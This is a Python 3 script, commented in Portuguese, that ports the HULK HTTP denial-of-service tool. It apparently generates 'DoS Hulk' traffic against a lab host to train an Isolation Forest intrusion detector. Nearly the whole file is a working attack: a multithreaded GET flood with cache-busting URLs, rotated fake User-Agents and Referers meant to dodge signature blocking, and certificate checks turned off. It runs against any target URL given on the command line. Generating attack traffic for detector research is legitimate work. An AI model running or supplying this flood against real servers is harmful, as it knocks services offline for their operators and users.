#!/usr/bin/env python3
# Apoio do assistente Claude (Anthropic, Opus 4.7/4.8) na construcao; revisado e validado pelo autor.
"""
HULK - HTTP Unbearable Load King (port para Python 3).

Reproduz o ataque de negacao de servico na camada de aplicacao (HTTP) que o
CIC-IDS2017 rotula como "DoS Hulk", gerado originalmente com a ferramenta HULK de
Barry Shteiman. Satura o servidor web com uma enxurrada de requisicoes GET
concorrentes. Cada requisicao usa URL unica (cache-buster), User-Agent e Referer
aleatorios, para furar qualquer cache e forcar o servidor a processar tudo do zero.

Apontado contra uma pagina dinamica com volume de resposta real (phpinfo.php,
~48 KB), gera o perfil de "anomalia de volume" que o modelo Isolation Forest
aprendeu a detectar: muito trafego de volta (bwd alto), pacotes grandes e forte
assimetria entre a requisicao pequena e a resposta grande.

Uso: python3 hulk.py http://192.168.56.101/phpinfo.php [segundos] [threads]
"""
import sys                       # leitura dos argumentos de linha de comando
import threading                 # execução de várias requisições em paralelo (threads)
import time                      # controle da duração do ataque e pausas
import random                    # sorteio de URL, User-Agent e Referer aleatórios
import urllib.request            # montagem e envio das requisições HTTP GET
import ssl                       # configuração do contexto TLS (caso o alvo redirecione para HTTPS)

# Aceita certificados HTTPS invalidos (a vitima usa HTTP simples, mas evita que o
# ataque pare caso o alvo redirecione para HTTPS autoassinado).
ssl._create_default_https_context = ssl._create_unverified_context   # desativa a verificação de certificado TLS

# Lista de User-Agents reais. Cada requisicao sorteia um diferente para parecer
# vir de navegadores variados e dificultar bloqueio por assinatura.
USER_AGENTS = [                  # navegadores fingidos, sorteados a cada requisição
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",  # Chrome no Windows
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",                                       # Firefox no Linux
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",  # Safari no macOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",        # Safari no iPhone
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",                                              # Internet Explorer antigo
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",                                                    # Opera antigo
]
# Referers falsos (origem fingida da requisicao), tambem sorteados a cada GET.
REFERERS = [                     # páginas de origem fingidas, sorteadas a cada requisição
    "http://www.google.com/?q=", "http://www.bing.com/search?q=",                              # buscadores
    "http://www.usatoday.com/search/results.php?q=", "http://engadget.search.aol.com/search?q=",  # sites de notícia/busca
    "http://192.168.56.101/",                                                                  # a própria vítima
]

# Argumentos da linha de comando: URL alvo, duracao em segundos e numero de threads.
url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.56.101/"  # 1º argumento: URL alvo (ou padrão)
dur = int(sys.argv[2]) if len(sys.argv) > 2 else 20                   # 2º argumento: duração do ataque em segundos
nthreads = int(sys.argv[3]) if len(sys.argv) > 3 else 20             # 3º argumento: número de threads concorrentes

stop = threading.Event()   # sinaliza para todas as threads pararem ao fim do tempo
sent = [0]                 # contador de requisicoes concluidas (lista p/ ser mutavel)
lock = threading.Lock()    # protege o contador no acesso concorrente


def buildurl():
    """Anexa um numero aleatorio na URL (cache-buster). Cada requisicao vira uma
    URL unica, entao nenhum cache responde por ela e o servidor processa tudo."""
    join = "&" if "?" in url else "?"                 # escolhe o separador conforme a URL já ter query ou não
    return url + join + str(random.randint(0, 2**31))  # devolve a URL com um número aleatório anexado


def attack():
    """Laco de cada thread: dispara GETs sem parar ate o sinal de stop. Monta a
    requisicao com cabecalhos aleatorios e keep-alive para manter a conexao viva."""
    while not stop.is_set():                                       # repete enquanto o sinal de parada não foi acionado
        try:                                                      # protege contra erros de conexão sob o flood
            req = urllib.request.Request(buildurl())              # cria a requisição com a URL única (cache-buster)
            req.add_header("User-Agent", random.choice(USER_AGENTS))  # define um User-Agent aleatório
            req.add_header("Cache-Control", "no-cache")              # proibe resposta cacheada
            req.add_header("Referer", random.choice(REFERERS) + str(random.randint(0, 1000)))  # Referer aleatório
            req.add_header("Keep-Alive", str(random.randint(110, 120)))  # tempo de keep-alive aleatório
            req.add_header("Connection", "keep-alive")               # reusa a conexao TCP
            urllib.request.urlopen(req, timeout=3).read()            # baixa a resposta inteira (gera volume)
            with lock:                                            # entra na região crítica do contador
                sent[0] += 1                                      # conta mais uma requisição concluída
        except Exception:                                         # qualquer erro de rede/recusa
            # Sob flood o servidor recusa varias conexoes; ignora o erro e continua.
            pass                                                  # ignora e segue disparando


print(f"HULK -> {url} | {dur}s | {nthreads} threads")  # informa alvo, duração e número de threads
# Cria e dispara as threads concorrentes (daemon: morrem junto com o processo).
ths = [threading.Thread(target=attack, daemon=True) for _ in range(nthreads)]  # cria as threads de ataque
for t in ths:                                          # percorre cada thread criada
    t.start()                                          # inicia a thread (começa a disparar GETs)
time.sleep(dur)            # deixa o ataque rodar pela duracao pedida
stop.set()                 # manda as threads pararem
time.sleep(2)              # espera as requisicoes em andamento fecharem
print(f"requisicoes enviadas: {sent[0]}")              # imprime o total de requisições concluídas
